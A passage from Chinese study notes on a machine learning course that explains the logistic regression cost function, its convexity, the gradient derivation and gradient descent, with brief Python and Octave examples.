src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101215458.png" alt></p><ul><li>但使用这个 平方代价函数的问题是 因为中间的这个 非常非线性的 sigmoid函数的出现 如果你要用平方函数定义它的话 导致$J(\theta)$成为 一个<code>非凸函数</code> 所以我们想做的是 <strong>另外找一个 不同的代价函数 它是凸函数</strong> 使得我们可以使用很好的算法 如梯度下降法 而且能保证找到全局最小值</li><li>下面这个代价函数便是我们要用在逻辑回归上的 我们认为 这个算法要付的代价或者惩罚 如果输出值是$h(x)$ 或者换句话说 假如说预测值$h(x)$ 是一个数 比如0.7 而实际上 真实的标签值是$y$ 那么代价值将等于 当$y=1$时 代价函数为$-log(h(x))$ 以及当$y=0$时 代价函数为$-log(1-h(x))$   这看起来是个非常复杂的函数 但是让我们画出这个函数 可以直观地感受一下它在做什么</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101221018.png" alt></p><ul><li>我们从$y=1$这个情况开始 如果$y$等于1 那么这个代价函数 是$-log(h(x))$ 如果我们要画出它 我们先将$h(x)$ 画在横坐标上 我们知道假设函数 的输出值 是在0和1之间的 对吧？ 所以$h(x)$的值 在0和1之间变化 如果你画出这个代价函数的样子 你会发现它看起来是这样的</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101221318.png" alt></p><ul><li>理解这个函数为什么是这样的一个方式是 如果你画出$log(z)$ $z$在横轴上 它看起来会是这样 它趋于负无穷 这是对数函数的样子 所以这里是0 这里是1 显然 这里的$z$ 就是代表$h(x)$的角色</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101221427.png" alt></p><ul><li>因此 $-log(z)$看起来这样 就是翻转一下符号</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101221523.png" alt></p><ul><li>我们所感兴趣的是 函数在0到1 之间的这个区间 所以 忽略那些 所以只剩下 曲线的这部分 这就是左边这条曲线的样子</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101221553.png" alt></p><ul><li>现在这个代价函数 有一些有趣而且很好的性质 首先 你注意到 如果$y=1$而且$h(x)=1$ 也就是说 如果假设函数$h(x)$ 刚好预测值是1 而且$y$刚好等于我预测的1 那么这个代价值等于0 而且这对应于下面这个点</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101221820.png" alt></p><ul><li>这里我们只需要考虑 $y=1$的情况 如果$h(x)$等于1 那么代价值等于0 这是我们所希望的 <strong>因为如果我们 正确预测了输出值$y$ 那么代价值是0</strong> 但是现在 同样注意到$h(x)$趋于0时 所以 那是$h$ 当假设函数的输出趋于0时 代价值激增 并且趋于无穷</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101222251.png" alt></p><ul><li>我们这样描述 体现出了这样一种直观的感觉 那就是如果<code>假设函数</code>输出0 相当于说 我们的假设函数说 $y=1$的概率等于0 这类似于 我们对病人说 你有一个恶性肿瘤的概率 即 $y=1$的概率是0 就是说你的肿瘤 完全不可能是恶性的 然而结果是 病人的肿瘤确实是恶性的 所以  即使我们告诉他们 $y=1$发生的概率是0 这个肿瘤完全不可能是恶性的 如果我们告诉他们这个 和我们的确信程度 并且最后我们是错的 <strong>那么我们就用非常非常大的代价值 惩罚这个学习算法</strong> 它是被这样体现出来 如果$y=1$ 而$h(x)$趋于0 这个代价值趋于无穷  以上是$y=1$时的情况</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101222837.png" alt></p><ul><li>我们再来看看 $y=0$时 代价值函数是什么样 如果$y=0$ 那么代价值是这个表达式 $-log(1-h_\theta(x))$ 如果画出函数 $-log(1-z)$ 那么你得到的 是这样 它从0到1 差不多这样</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101223146.png" alt></p><ul><li>如果你画出 y=0情况下的代价函数 你会发现大概是这样 它现在所做的是 在$h(x)$趋于1时激增 趋于正无穷 因为它是说 如果最后发现 $y$等于0 而我们却几乎 非常肯定地预测 $y=1$的概率是1 那么我们最后就要付出非常大的代价值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101223244.png" alt></p><ul><li>反过来 如果$h(x)=0$ 而且$y=0$ 那么假设函数预测对了 预测的是$y=0$ 并且y就是等于0 那么代价值函数在这点上 应该等于0</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101223557.png" alt></p><ul><li>在这个视频中 我们定义了 单训练样本的代价函数 凸性分析的内容是超出这门课的范围的 但是可以证明 我们所选的 代价值函数 会给我们一个 凸优化问题 代价函数$J(\theta)$会是一个凸函数 并且没有局部最优值 在下一个视频中 我们会把单训练样本的 代价函数的这些理念 进一步发展 然后给出 整个训练集的代价函数的定义 我们还会找到一种 比我们目前用的 更简单的写法,基于这些推导出的结果 我们将应用梯度下降法 得到我们的逻辑回归算法</li></ul><h3 id="小小的总结–代价函数"><a href="#小小的总结–代价函数" class="headerlink" title="小小的总结–代价函数"></a>小小的总结–代价函数</h3><p>在这段视频中，我们要介绍<strong>如何拟合逻辑回归模型的参数$\theta$</strong>。具体来说，我要定义用来拟合参数的优化目标或者叫<code>代价函数</code>，这便是监督学习问题中的逻辑回归模型的拟合问题。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214506.png" alt></p><p>对于线性回归模型，我们定义的代价函数是所有模型误差的平方和。将其转换一下,如下图</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181105144805.png" alt></p><p>理论上来说，我们也可以对逻辑回归模型沿用这个定义，但是问题在于，当我们将${h_\theta}\left( x \right)=\frac{1}{1+{e^{-\theta^{T}}X}}$代入到这样定义了的代价函数中时，我们得到的代价函数将是一个<code>非凸函数（non-convexfunction）</code>。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214515.png" alt></p><p>这意味着我们的代价函数有许多局部最小值，这将影响梯度下降算法寻找全局最小值。</p><p>线性回归的代价函数为：$J\left( \theta  \right)=\frac{1}{m}\sum\limits_{i=1}^{m}{\frac{1}{2}{{\left( {h_\theta}\left({x}^{\left( i \right)} \right)-{y}^{\left( i \right)} \right)}^{2}}}$ 。<br>我们重新定义<code>逻辑回归的代价函数</code>为：$J\left( \theta  \right)=\frac{1}{m}\sum\limits_{i=1}^{m}{{Cost}\left( {h_\theta}\left( {x}^{\left( i \right)} \right),{y}^{\left( i \right)} \right)}$，其中</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214524.png" alt></p>${h_\theta}\left( x \right)$与 $Cost\left( {h_\theta}\left( x \right),y \right)$之间的关系如下图所示：**横轴**是$h_\theta(x)$,**y轴**是不同的`cost()`函数<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214533.png" alt></p><p>这样构建的$Cost\left( {h_\theta}\left( x \right),y \right)$函数的特点是：当实际的  $y=1$ 且${h_\theta}\left( x \right)$也为 1 时误差为 0，当 $y=1$ 但${h_\theta}\left( x \right)$不为1时误差随着${h_\theta}\left( x \right)$变小而变大；当实际的 $y=0$ 且${h_\theta}\left( x \right)$也为 0 时代价为 0，当$y=0$ 但${h_\theta}\left( x \right)$不为 0时误差随着 ${h_\theta}\left( x \right)$的变大而变大。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214543.png" alt></p><p>对于第一个图,我们的预测值$h_\theta(x)$与真实值$y$相同,所有<code>cost()</code>应该是<code>0</code>,满足我们的需求,之后的也一样</p><p>将构建的 $Cost\left( {h_\theta}\left( x \right),y \right)$简化如下：<br><strong>$Cost\left( {h_\theta}\left( x \right),y \right)=-y\times log\left( {h_\theta}\left( x \right) \right)-(1-y)\times log\left( 1-{h_\theta}\left( x \right) \right)$</strong></p><p>带入代价函数得到：</p>$J\left( \theta  \right)=\frac{1}{m}\sum\limits_{i=1}^{m}{[-{{y}^{(i)}}\log \left( {h_\theta}\left( {{x}^{(i)}} \right) \right)-\left( 1-{{y}^{(i)}} \right)\log \left( 1-{h_\theta}\left( {{x}^{(i)}} \right) \right)]}$<p>即：$J\left( \theta  \right)=-\frac{1}{m}\sum\limits_{i=1}^{m}{[{{y}^{(i)}}\log \left( {h_\theta}\left( {{x}^{(i)}} \right) \right)+\left( 1-{{y}^{(i)}} \right)\log \left( 1-{h_\theta}\left( {{x}^{(i)}} \right) \right)]}$</p><p><strong>向量化如下</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214550.png" alt></p><p>Python代码实现：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">def</span> <span class="token function">cost</span><span class="token punctuation">(</span>theta<span class="token punctuation">,</span> X<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>  theta <span class="token operator">=</span> np<span class="token punctuation">.</span>matrix<span class="token punctuation">(</span>theta<span class="token punctuation">)</span>  X <span class="token operator">=</span> np<span class="token punctuation">.</span>matrix<span class="token punctuation">(</span>X<span class="token punctuation">)</span>  y <span class="token operator">=</span> np<span class="token punctuation">.</span>matrix<span class="token punctuation">(</span>y<span class="token punctuation">)</span>  first <span class="token operator">=</span> np<span class="token punctuation">.</span>multiply<span class="token punctuation">(</span><span class="token operator">-</span>y<span class="token punctuation">,</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>sigmoid<span class="token punctuation">(</span>X<span class="token operator">*</span> theta<span class="token punctuation">.</span>T<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  second <span class="token operator">=</span> np<span class="token punctuation">.</span>multiply<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> sigmoid<span class="token punctuation">(</span>X<span class="token operator">*</span> theta<span class="token punctuation">.</span>T<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> np<span class="token punctuation">.</span>sum<span class="token punctuation">(</span>first <span class="token operator">-</span> second<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>在得到这样一个代价函数以后，我们便可以用<code>梯度下降算法</code>来求得能使代价函数最小的参数了。算法为：</p><p>Repeat {</p>$\theta_j := \theta_j - \alpha \frac{\partial}{\partial\theta_j} J(\theta)$<p>(simultaneously update all )<br>}</p><p>求导后得到：</p><p>Repeat {</p>$\theta_j := \theta_j - \alpha \frac{1}{m}\sum\limits_{i=1}^{m}{{\left( {h_\theta}\left( \mathop{x}^{\left( i \right)} \right)-\mathop{y}^{\left( i \right)} \right)}}\mathop{x}_{j}^{(i)}$<p>(simultaneously update all )<br>}<br><strong>向量化如下</strong>:</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214557.png" alt></p><p>在这个视频中，我们定义了单训练样本的代价函数，凸性分析的内容是超出这门课的范围的，但是可以证明我们所选的代价值函数会给我们一个凸优化问题。代价函数J($\theta$)会是一个凸函数，并且没有局部最优值。</p><p>推导过程：</p>$J\left( \theta  \right)=-\frac{1}{m}\sum\limits_{i=1}^{m}{[{{y}^{(i)}}\log \left( {h_\theta}\left( {{x}^{(i)}} \right) \right)+\left( 1-{{y}^{(i)}} \right)\log \left( 1-{h_\theta}\left( {{x}^{(i)}} \right) \right)]}$<p>考虑：</p>${h_\theta}\left( {{x}^{(i)}} \right)=\frac{1}{1+{{e}^{-{\theta^T}{{x}^{(i)}}}}}$<p>则：</p>${{y}^{(i)}}\log \left( {h_\theta}\left( {{x}^{(i)}} \right) \right)+\left( 1-{{y}^{(i)}} \right)\log \left( 1-{h_\theta}\left( {{x}^{(i)}} \right) \right)$$={{y}^{(i)}}\log \left( \frac{1}{1+{{e}^{-{\theta^T}{{x}^{(i)}}}}} \right)+\left( 1-{{y}^{(i)}} \right)\log \left( 1-\frac{1}{1+{{e}^{-{\theta^T}{{x}^{(i)}}}}} \right)$$=-{{y}^{(i)}}\log \left( 1+{{e}^{-{\theta^T}{{x}^{(i)}}}} \right)-\left( 1-{{y}^{(i)}} \right)\log \left( 1+{{e}^{{\theta^T}{{x}^{(i)}}}} \right)$<p>所以：</p>$\frac{\partial }{\partial {\theta_{j}}}J\left( \theta  \right)=\frac{\partial }{\partial {\theta_{j}}}[-\frac{1}{m}\sum\limits_{i=1}^{m}{[-{{y}^{(i)}}\log \left( 1+{{e}^{-{\theta^{T}}{{x}^{(i)}}}} \right)-\left( 1-{{y}^{(i)}} \right)\log \left( 1+{{e}^{{\theta^{T}}{{x}^{(i)}}}} \right)]}]$$=-\frac{1}{m}\sum\limits_{i=1}^{m}{[-{{y}^{(i)}}\frac{-x_{j}^{(i)}{{e}^{-{\theta^{T}}{{x}^{(i)}}}}}{1+{{e}^{-{\theta^{T}}{{x}^{(i)}}}}}-\left( 1-{{y}^{(i)}} \right)\frac{x_j^{(i)}{{e}^{{\theta^T}{{x}^{(i)}}}}}{1+{{e}^{{\theta^T}{{x}^{(i)}}}}}}]$$=-\frac{1}{m}\sum\limits_{i=1}^{m}{{y}^{(i)}}\frac{x_j^{(i)}}{1+{{e}^{{\theta^T}{{x}^{(i)}}}}}-\left( 1-{{y}^{(i)}} \right)\frac{x_j^{(i)}{{e}^{{\theta^T}{{x}^{(i)}}}}}{1+{{e}^{{\theta^T}{{x}^{(i)}}}}}]$$=-\frac{1}{m}\sum\limits_{i=1}^{m}{\frac{{{y}^{(i)}}x_j^{(i)}-x_j^{(i)}{{e}^{{\theta^T}{{x}^{(i)}}}}+{{y}^{(i)}}x_j^{(i)}{{e}^{{\theta^T}{{x}^{(i)}}}}}{1+{{e}^{{\theta^T}{{x}^{(i)}}}}}}$$=-\frac{1}{m}\sum\limits_{i=1}^{m}{\frac{{{y}^{(i)}}\left( 1\text{+}{{e}^{{\theta^T}{{x}^{(i)}}}} \right)-{{e}^{{\theta^T}{{x}^{(i)}}}}}{1+{{e}^{{\theta^T}{{x}^{(i)}}}}}x_j^{(i)}}$$=-\frac{1}{m}\sum\limits_{i=1}^{m}{({{y}^{(i)}}-\frac{{{e}^{{\theta^T}{{x}^{(i)}}}}}{1+{{e}^{{\theta^T}{{x}^{(i)}}}}})x_j^{(i)}}$$=-\frac{1}{m}\sum\limits_{i=1}^{m}{({{y}^{(i)}}-\frac{1}{1+{{e}^{-{\theta^T}{{x}^{(i)}}}}})x_j^{(i)}}$$=-\frac{1}{m}\sum\limits_{i=1}^{m}{[{{y}^{(i)}}-{h_\theta}\left( {{x}^{(i)}} \right)]x_j^{(i)}}$$=\frac{1}{m}\sum\limits_{i=1}^{m}{[{h_\theta}\left( {{x}^{(i)}} \right)-{{y}^{(i)}}]x_j^{(i)}}$<p>注：虽然得到的梯度下降算法表面上看上去与线性回归的梯度下降算法一样，但是这里的${h_\theta}\left( x \right)=g\left( {\theta^T}X \right)$与线性回归中不同，所以实际上是不一样的。另外，在运行梯度下降算法之前，进行<code>特征缩放</code>依旧是非常必要的。</p><p>一些梯度下降算法之外的选择：<br>除了梯度下降算法以外，还有一些常被用来令代价函数最小的算法，这些算法更加复杂和优越，而且通常不需要人工选择学习率，通常比梯度下降算法要更加快速。这些算法有：<code>共轭梯度（Conjugate Gradient）</code>，<code>局部优化法(Broyden fletcher goldfarb shann,BFGS)</code>和<code>有限内存局部优化法(LBFGS)</code> <code>fminunc</code>是 matlab和octave 中都带的一个最小值优化函数，<strong>使用时我们需要提供代价函数和每个参数的求导</strong>，下面是 octave 中使用 fminunc 函数的代码示例：</p><pre class=" language-octave"><code class="language-octave">function [jVal, gradient] = costFunction(theta)    jVal = [...code to compute J(theta)...];    gradient = [...code to compute derivative of J(theta)...];endoptions = optimset('GradObj', 'on', 'MaxIter', '100');initialTheta = zeros(2,1);[optTheta, functionVal, exitFlag] = fminunc(@costFunction, initialTheta, options);</code></pre><p>在下一个视频中，我们会把单训练样本的代价函数的这些理念进一步发展，然后给出整个训练集的代价函数的定义，我们还会找到一种比我们目前用的更简单的写法，基于这些推导出的结果，我们将应用梯度下降法得到我们的逻辑回归算法。</p><h2 id="6-5-简化的成本函数和梯度下降"><a href="#6-5-简化的成本函数和梯度下降" class="headerlink" title="6.5 简化的成本函数和梯度下降"></a>6.5 简化的成本函数和梯度下降</h2><ul><li>在这段视频中 我们将会找出 一种稍微简单一点的方法来 写代价函数 来替换我们现在用的方法 同时我们还要弄清楚 如何运用梯度下降法 来拟合出逻辑回归的参数 因此 听了这节课 你就应该知道如何 实现一个完整的逻辑回归算法</li><li>这就是逻辑回归的代价函数 我们的整体代价函数 不同的训练样本 假设函数 $h(x)$ 对实际值 $y^{(i)}$ 进行预测 所得到的不同误差 算出的 <code>Cost 函数值</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105044.png" alt></p><ul><li>并且这是我们之前 算出来的一个单个样本的代价值 我只是想提醒你一下 <strong>对于分类问题 我们的训练集 甚至其他不在训练集中的样本 $y$ 的值总是等于0或1的</strong>  对吗？这就是 $y$ 的数学定义决定的</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105248.png" alt></p><ul><li>由于 $y$ 是0或1 我们就可以 想出一个简单的 方式来写这个代价函数 具体来说 为了避免把代价函数 写成两行 避免分成 $y=1$ 或 $y=0$ 两种情况来写 我们要用一种方法 来把这两个式子 合并成一个 这将使我们更方便地 写出代价函数 并推导出梯度下降</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105403.png" alt></p><ul><li>具体而言 我们可以如下写出代价函数 $Cost(h(x), y)$ 可以写成 以下的形式 $Cost(h_\theta(x),y)=-ylog(h_\theta(x))-(1-y)log(1-h_\theta(x))$我马上就会给你演示 这个表达式或 等式与我们已经得出的 代价函数的表达 是完全等效的 并且更加紧凑 让我们来看看为什么会是这样</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105431.png" alt></p><ul><li>我们知道有两种可能情况 $y$ 必须是0或1 因此 我们假设 $y$ 等于1  那么这个Cost 值 是等于 $-1*log(h_\theta(x))-(1-1)log(1-h_\theta(x))$ 如果 y 等于1 那么 $1-y$ 就是$1-1$ 也就是0 因此第二项乘以0 就被消去了 我们只留下了 第一项 $y=1$倍的$log$ 项 $-logh_\theta(x)$ 因此就等于这个等式  而这个等式正是我们在上面未简化时 $y=1$ 的情况</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105452.png" alt></p><ul><li>另一种情况是 如果 $y=0$ 如果是这样的话 那么写出的 Cost 函数就是这样的 如果 $y$ 是等于0 那么第一项就为0 而$1-y$ 在$y=0$时  $1-y$就是 $1-0$ 所以 最后就等于1 这样 Cost 函数 就简化为只有这最后一项 $-log(1-h_\theta(x))$对吧？ 因为第一项 在这里乘以零 所以它被消去了 所以 我们只剩下最后的 $-log(1-h_\theta(x))$ 这一项   而且这一项 就是当$y=0$时的这一项</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105515.png" alt></p><ul><li>因此这表明 这样定义的 Cost 函数 只是把这两个式子 写成一种更紧凑的形式 不需要分 $y=1$ 或 $y=0$ 来写 直接写在一起 只用一行来表示</li><li>这样我们就可以写出 逻辑回归的代价函数如下 它是这样的 就是 $\frac{1}{m}$ 乘以后面这个 Cost 函数 在这里放入之前 定义好的 Cost 函数 这个函数就完成了 我们把负号放在外面 我们为什么要把代价函数写成这种形式 似乎我们也可以选择别的方法来写代价函数 在这节课中我没有时间 来介绍有关这个问题的细节 但我可以告诉你 这个式子是从统计学中的 <code>极大似然法</code>得来的 估计 统计学的思路是 如何为不同的模型 有效地找出不同的参数 同时它还有一个很好的性质 它是<code>凸的</code> 因此 这就是基本上 大部分人使用的 逻辑回归代价函数 如果我们不理解这些项 如果你不知道 什么是极大似然估计 不用担心 这里只是一个更深入 更合理的证明而已 在这节课中 我没有时间去仔细讲解</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105534.png" alt></p><ul><li>根据这个代价函数 为了拟合出参数 我们怎么办呢？我们要试图找尽量让 $J(\theta)$ 取得最小值的参数 $\theta$ 所以我们想要尽量减小这一项 这将我们将得到某个参数  $\theta$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105546.png" alt></p><ul><li>最后 如果我们给出一个新的样本 假如某个特征 $x$  我们可以用拟合训练样本的参数 $\theta$  来输出对假设的预测 另外提醒你一下 我们假设的输出 实际上就是这个概率值 $p(y=1|x;\theta)$ 就是关于 $x$ 以 $\theta$ 为参数 $y=1$ 的概率 你就把这个想成我们的假设 就是估计 $y=1$ 的概率 所以 接下来要做的事情 就是弄清楚 作为一个关于 $\theta$ 的函数 如何最大限度地 最小化代价函数 $J(\theta)$  这样我们才能为训练集拟合出参数 $\theta$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105556.png" alt></p><ul><li>最小化代价函数的方法 是使用<code>梯度下降法(gradient descent)</code> 这是我们的代价函数</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105614.png" alt></p><ul><li>如果我们要最小化这个关于 $\theta$ 的函数值 这就是我们通常用的<code>梯度下降法的模板</code> 我们要反复更新每个参数 用这个式子来更新 就是用它自己减去 学习率 $\alpha$ 乘以后面的微分项</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105627.png" alt></p><ul><li>如果你知道一些微积分的知识 你可以自己动手 算一算这个微分项 $\frac{\partial}{\partial\theta_j}J(\theta)$ 看看你算出来的 跟我得到的是不是一样 即使你不知道微积分 也不用担心 如果你计算一下的话 你会得到的是这个式子 $\frac{\partial}{\partial\theta_j}J(\theta)=\frac{1}{m}\sum\limits_{i=1}^m\left(h_\theta(x^{(i)}-y^{(i)}\right)x_j^{(i)}$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105653.png" alt></p><ul><li>所以你把这个偏导数项 放回到原来式子这里 我们就可以将 梯度下降算法写作如下形式</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105705.png" alt></p><ul><li>所以，如果你有 $n$ 个特征，也就是说：$\theta=\begin{bmatrix} \theta_0\\\ \theta_1\\\ \theta_2\\\ ...\\\ \theta_n \end{bmatrix}$，参数向量$\theta$包括${\theta_{0}}$ ${\theta_{1}}$ ${\theta_{2}}$ 一直到${\theta_{n}}$，那么你就需要用这个式子：</li></ul>${\theta_j}:={\theta_j}-\alpha \frac{1}{m}\sum\limits_{i=1}^{m}{({h_\theta}({{x}^{(i)}})-{{y}^{(i)}}){{x}_{j}}^{(i)}}$来同时更新所有$\theta$的值。<ul><li><p>现在，如果你把这个更新规则和我们之前用在线性回归上的进行比较的话，你会惊讶地发现，这个式子正是我们用来做线性回归梯度下降的。那么，线性回归和逻辑回归是同一个算法吗？要回答这个问题，我们要观察逻辑回归看看发生了哪些变化。实际上，<strong>假设的定义发生了变化</strong>。</p></li><li><p>对于线性回归假设函数：${h_\theta}\left( x \right)={\theta^T}X={\theta_{0}}{x_{0}}+{\theta_{1}}{x_{1}}+{\theta_{2}}{x_{2}}+...+{\theta_{n}}{x_{n}}$ 而现在逻辑函数假设函数 ${h_\theta}\left( x \right)=\frac{1}{1+{{e}^{-{\theta^T}X}}}$ 因此，即使更新参数的规则看起来基本相同，但由于假设的定义发生了变化，所以逻辑函数的梯度下降，跟线性回归的梯度下降实际上是两个完全不同的东西。</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105719.png" alt></p><ul><li>在先前的视频中 当我们在谈论线性回归的 梯度下降法时 我们谈到了如何监控 梯度下降法以确保其收敛 我通常也把同样的方法 用在逻辑回归中 来监测梯度下降 以确保它正常收敛 希望你自己能想清楚 如何把同样的方法 应用到逻辑函数的梯度下降中</li><li>当使用梯度下降法 来实现逻辑回归时 我们有这些不同的参数 θ 就是 θ0 到 θn 我们需要用这个表达式来更新这些参数 我们还可以使用 for 循环来实现 所以 <code>for i=1 to n</code> 或者 <code>for i=1 to n+1</code> 用一个 for 循环来更新这些参数值 当然 不用 for 循环也是可以的 理想情况下 我们更提倡使用<code>向量化</code>的实现 因此 向量化的实现 可以把所有这些 $n$ 个 参数同时更新 一举搞定 为了检查你自己的理解 是否到位 你可以自己想想 应该怎么样实现这个 向量化的实现方法</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190102105734.png" alt></p><ul><li>好的 现在你知道如何 实现逻辑回归的梯度下降 最后还有一个 我们之前在谈线性回归时讲到的特征缩放 我们看到了特征缩放是如何 提高梯度下降的收敛速度的 这个特征缩放的方法 也适用于逻辑回归 如果你的特征范围差距很大的话 那么应用特征缩放的方法 同样也可以让逻辑回归中 梯度下降收敛更快</li><li>就是这样 现在你知道如何实现 逻辑回归 这是一种非常强大 甚至可能世界上使用最广泛的 一种分类算法 而现在你已经知道如何去实现它了</li></ul><h3 id="小小的总结–简化的成本函数和梯度下降"><a href="#小小的总结–简化的成本函数和梯度下降" class="headerlink" title="小小的总结–简化的成本函数和梯度下降"></a>小小的总结–简化的成本函数和梯度下降</h3><p>在这段视频中，我们将会找出一种稍微简单一点的方法来写代价函数，来替换我们现在用的方法。同时我们还要弄清楚如何运用梯度下降法，来拟合出逻辑回归的参数。因此，听了这节课，你就应该知道如何实现一个完整的逻辑回归算法。</p><p>这就是逻辑回归的代价函数：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214605.png" alt></p><p>这个式子可以合并成：</p>$Cost\left( {h_\theta}\left( x \right),y \right)=-y\times log\left( {h_\theta}\left( x \right) \right)-(1-y)\times log\left( 1-{h_\theta}\left( x \right) \right)$<p>即，逻辑回归的代价函数：</p>$Cost\left( {h_\theta}\left( x \right),y \right)=-y\times log\left( {h_\theta}\left( x \right) \right)-(1-y)\times log\left( 1-{h_\theta}\left( x \right) \right)$$=-\frac{1}{m}\sum\limits_{i=1}^{m}{[{{y}^{(i)}}\log \left( {h_\theta}\left( {{x}^{(i)}} \right) \right)+\left( 1-{{y}^{(i)}} \right)\log \left( 1-{h_\theta}\left( {{x}^{(i)}} \right) \right)]}$<p>根据这个代价函数，为了拟合出参数，该怎么做呢？我们要试图找尽量让 $J\left( \theta  \right)$ 取得最小值的参数$\theta$。</p>$\underset{\theta}{\min }J\left( \theta  \right)$<p>所以我们想要尽量减小这一项，这将我们将得到某个参数$\theta$。<br>如果我们给出一个新的样本，假如某个特征 x，我们可以用拟合训练样本的参数$\theta$，来输出对假设的预测。<br>另外，我们假设的输出，实际上就是这个概率值：$p(y=1|x;\theta)$，就是关于 $x$以$\theta$为参数，$y=1$ 的概率，你可以认为我们的假设就是估计 $y=1$ 的概率，所以，接下来就是弄清楚如何最大限度地最小化代价函数$J\left( \theta  \right)$，作为一个关于$\theta$的函数，这样我们才能为训练集拟合出参数$\theta$。</p><p>最小化代价函数的方法，是使用梯度下降法(gradient descent)。这是我们的代价函数：</p>$J\left( \theta  \right)=-\frac{1}{m}\sum\limits_{i=1}^{m}{[{{y}^{(i)}}\log \left( {h_\theta}\left( {{x}^{(i)}} \right) \right)+\left( 1-{{y}^{(i)}} \right)\log \left( 1-{h_\theta}\left( {{x}^{(i)}} \right) \right)]}$<p>如果我们要最小化这个关于$\theta$的函数值，这就是我们通常用的梯度下降法的模板。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214631.png" alt></p><p>我们要反复更新每个参数，用这个式子来更新，就是用它自己减去学习率 $\alpha$ 乘以后面的微分项。求导后得到：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214638.png" alt></p><p>如果你计算一下的话，你会得到这个等式：</p>${\theta_j}:={\theta_j}-\alpha \frac{1}{m}\sum\limits_{i=1}^{m}{({h_\theta}({{x}^{(i)}})-{{y}^{(i)}}){x_{j}}^{(i)}}$<p>我把它写在这里，将后面这个式子，在 $i=1$  到 $m$ 上求和，其实就是预测误差乘以$x_j^{(i)}$ ，所以你把这个偏导数项$\frac{\partial }{\partial {\theta_j}}J\left( \theta  \right)$放回到原来式子这里，我们就可以将梯度下降算法写作如下形式：</p>${\theta_j}:={\theta_j}-\alpha \frac{1}{m}\sum\limits_{i=1}^{m}{({h_\theta}({{x}^{(i)}})-{{y}^{(i)}}){x_{j}}^{(i)}}$<p>所以，如果你有 $n$ 个特征，也就是说：<img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214650.png" alt>，参数向量$\theta$包括${\theta_{0}}$ ${\theta_{1}}$ ${\theta_{2}}$ 一直到${\theta_{n}}$，那么你就需要用这个式子：</p>${\theta_j}:={\theta_j}-\alpha \frac{1}{m}\sum\limits_{i=1}^{m}{({h_\theta}({{x}^{(i)}})-{{y}^{(i)}}){{x}_{j}}^{(i)}}$来同时更新所有$\theta$的值。<p>现在，如果你把这个更新规则和我们之前用在线性回归上的进行比较的话，你会惊讶地发现，这个式子正是我们用来做线性回归梯度下降的。</p><p>那么，线性回归和逻辑回归是同一个算法吗？要回答这个问题，我们要观察逻辑回归看看发生了哪些变化。实际上，假设的定义发生了变化。</p><p>对于线性回归假设函数：</p>${h_\theta}\left( x 